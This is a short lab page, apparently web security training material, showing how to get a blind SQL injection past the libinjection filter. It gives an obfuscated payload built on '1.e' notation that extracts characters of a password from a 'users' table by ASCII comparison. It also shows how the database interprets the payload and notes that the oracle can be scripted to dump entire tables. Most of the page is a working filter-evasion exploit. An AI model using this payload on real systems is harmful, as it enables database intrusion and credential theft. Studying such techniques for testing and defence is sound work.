# SQL Syntax Lab

Here is the general syntax necessary to confuse libinjection. With this SQL syntax, we are targeting the field `password` from the table `users`. The function substring is used to extract one character at the time and comparing it to an ascii value (`70` in the example).


## Payload

=== ":octicons-check-circle-fill-16: Obfuscated query"

    With the `1.e` notation expression that are ignored by the DBMS.

    ```sql
    1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
    ```

=== ":octicons-skip-16: Actual query"

    This is how the DBMS will interpret 

    ```sql
    (ascii (substring((select password from users limit 1,1) ,1 ,1 ))) = 70 or'1'='2
    ```

## Scripting

Once you have working request that is producing an oracle (binary response based on the matching content). It is possible to script an attack to extract the complete content of any database tables.

